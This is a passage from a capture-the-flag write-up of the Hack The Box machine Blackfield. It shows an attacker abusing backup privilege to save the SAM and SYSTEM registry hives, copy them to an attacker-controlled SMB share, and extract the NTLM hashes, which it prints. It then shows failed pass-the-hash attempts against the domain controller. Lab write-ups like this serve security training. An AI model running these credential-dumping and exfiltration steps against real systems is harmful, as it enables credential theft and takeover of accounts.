# Dump SYSTEM and SAM hives

Following [this](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md), we dump the Administrator hashes

```text
*Evil-WinRM* PS C:\Users\svc_backup\Downloads> cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
The operation completed successfully.

The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Downloads> robocopy .\ \\10.10.14.78\kali SAM SYSTEM

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, April 11, 2021 5:23:01 PM
   Source : C:\Users\svc_backup\Downloads\
     Dest = \\10.10.14.78\kali\

    Files : SAM
            SYSTEM

  Options : /DCOPY:DA /COPY:DAT /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:\Users\svc_backup\Downloads\
            New File               45056        SAM
  0%
100%
            New File              16.4 m        SYSTEM
  0.0%
  6.0%
 12.1%
 18.2%
 24.3%
 30.4%
 36.5%
 42.6%
 48.7%
 54.8%
 60.9%
 67.0%
 73.1%
 79.2%
 85.3%
 91.4%
 97.5%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0         0
   Bytes :   16.44 m   16.44 m         0         0         0         0
   Times :   0:00:01   0:00:01                       0:00:00   0:00:00


   Speed :            10713202 Bytes/sec.
   Speed :             613.014 MegaBytes/min.
   Ended : Sunday, April 11, 2021 5:23:02 PM


root@kali:~/CTF/HTB/Blackfield/PE# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

But the Administrator hashes didn't work

```text
root@kali:~/CTF/HTB/Blackfield/PE# crackmapexec smb 10.10.10.192 -u Administrator -H 67ef902eae0d740df6257f273de75051
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:67ef902eae0d740df6257f273de75051 STATUS_LOGON_FAILURE
root@kali:~/CTF/HTB/Blackfield/PE# crackmapexec smb 10.10.10.192 -u Administrator -d blackfield.local -H 67ef902eae0d740df6257f273de75051
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] blackfield.local\Administrator:67ef902eae0d740df6257f273de75051 STATUS_LOGON_FAILURE
```

